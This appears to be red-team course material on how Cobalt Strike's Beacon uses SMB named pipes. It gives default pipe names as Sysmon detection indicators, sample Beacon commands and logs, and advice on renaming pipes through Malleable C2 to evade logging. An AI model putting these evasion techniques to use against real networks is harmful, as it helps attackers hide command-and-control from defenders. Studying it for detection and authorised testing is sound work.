Beacon uses SMB named pipes in four main ways.

1.  Retrieve output from some fork and run commands such as execute-assembly and powerpick.
2.  Connect to Beacon's SSH agent (not something we use in the course).
3.  The SMB Beacon's named pipe stager (also not often used).
4.  C2 comms in the SMB Beacon itself.

Sysmon event ID 17 (pipe created) and 18 (pipe connected) can be used to spot the default pipe name used by Beacon in these situations.

The default pipe name for post-ex commands is `postex_####`; the default for the SSH agent is `postex_ssh_####`; the default for the SMB Beacon's stager is `status_##`; and the default for the main SMB Beacon C2 is `msagent_##`.  In each case, the #'s are replaced with random hex values.

Execute a fork and run command:

```
beacon> powerpick Get-ChildItem
```

We should get an event like this (the image name is the spawnto process):

```shell
Pipe Created:
EventType: CreatePipe
ProcessId: 4664
PipeName: \postex_7b88
Image: C:\Windows\system32\notepad.exe
```

  

We get the same by spawning an SMB Beacon.

```shell
beacon> spawn x64 smb
[*] Tasked beacon to spawn (x64) windows/beacon_bind_pipe (\\.\pipe\msagent_36)
[+] host called home, sent: 255536 bytes
[+] established link to child beacon: 10.10.120.106

Pipe Created:
EventType: CreatePipe
ProcessId: 5044
PipeName: \msagent_36
Image: C:\Windows\system32\notepad.exe
```

  

Many Sysmon configurations only log specific (known) pipe names, such as the defaults used in various toolsets.  So in most cases, changing the pipe names to something relatively random will get you by most times.  Some operators choose to use names that are used by legitimate applications - a good example is the "mojo" pipe name that Google Chrome uses.  If you go down this route, make sure your ppid and spawnto match this pretext, otherwise you're going to create anomalous logs.

The `pipename_stager` and `ssh_pipename` Malleable C2 directives are global options (not part of a specific block).

To change the pipe name used in post-ex commands, use the `set pipename` directive in the `post-ex` block.  This can take a comma-separated list of names, and can include the # character for some randomisation.

```
post-ex {
        set pipename "totally_not_beacon, legitPipe_##";
}
```